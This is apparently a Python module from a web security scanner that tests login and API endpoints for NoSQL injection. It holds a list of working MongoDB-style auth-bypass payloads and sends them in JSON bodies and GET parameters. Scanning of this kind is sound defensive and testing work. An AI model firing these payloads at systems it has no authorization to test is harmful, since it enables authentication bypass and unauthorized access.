"""NoSQL injection scanner."""

from __future__ import annotations

import json

import requests

from .utils import Finding, get_base_url, normalize_url, safe_request

NOSQL_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    "'; return true; var foo='",
    "admin' || '1'=='1",
    '{"$where": "1==1"}',
    "true, $where: '1 == 1'",
]


class NoSQLScanner:
    """Détecte les injections NoSQL (MongoDB, etc.)."""

    def __init__(self, target: str, session: requests.Session):
        self.target = normalize_url(target)
        self.base_url = get_base_url(self.target)
        self.session = session
        self.findings: list[Finding] = []

    def run_full_scan(self) -> list[Finding]:
        endpoints = [
            self.target,
            f"{self.base_url}/api/login",
            f"{self.base_url}/api/users",
            f"{self.base_url}/login",
            f"{self.base_url}/api/auth",
        ]
        for ep in endpoints:
            self._test_json_injection(ep)
            self._test_param_injection(ep)
        return self.findings

    def _test_json_injection(self, url: str) -> None:
        for payload in NOSQL_PAYLOADS:
            try:
                data = json.loads(payload) if payload.startswith("{") else None
            except json.JSONDecodeError:
                data = None

            bodies = [
                {"username": payload, "password": payload},
                {"email": payload, "password": "test"},
                {"user": payload},
            ]
            if data:
                bodies.append(data)

            for body in bodies:
                resp = safe_request(
                    self.session, "POST", url,
                    json=body,
                    headers={"Content-Type": "application/json"},
                )
                if not resp:
                    continue
                if resp.status_code == 200 and any(
                    kw in resp.text.lower() for kw in ("token", "success", "welcome", "authenticated", "session")
                ):
                    self.findings.append(
                        Finding(
                            title="NoSQL Injection — auth bypass",
                            severity="critical",
                            category="NoSQL Injection",
                            url=url,
                            description="Bypass d'authentification via injection NoSQL",
                            evidence=f"Payload: {payload}, Body: {body}",
                            remediation="Valider et typer les entrées, désactiver $where",
                        )
                    )
                    return

    def _test_param_injection(self, url: str) -> None:
        for payload in NOSQL_PAYLOADS[:4]:
            resp = safe_request(self.session, "GET", url, params={"username": payload, "password": payload})
            if resp and resp.status_code == 200 and "error" not in resp.text.lower():
                if any(kw in resp.text.lower() for kw in ("token", "success", "admin")):
                    self.findings.append(
                        Finding(
                            title="NoSQL Injection via GET params",
                            severity="critical",
                            category="NoSQL Injection",
                            url=url,
                            description="Injection NoSQL via paramètres GET",
                            evidence=f"Payload: {payload}",
                        )
                    )
